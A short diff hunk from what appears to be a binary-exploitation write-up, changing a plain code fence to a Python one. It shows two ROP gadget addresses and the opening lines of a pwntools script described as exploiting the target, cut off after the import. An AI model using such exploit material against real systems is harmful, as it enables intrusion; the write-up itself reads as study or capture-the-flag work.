@@ -102,7 +102,7 @@ fil: 0x00000000004011df: nop; ret;
 g15: 0x0000000000401010: call rax;
 ```
 - below is the python script that automatically exploits it:
-```
+```python
 #!/usr/bin/env python3
 
 import pwn
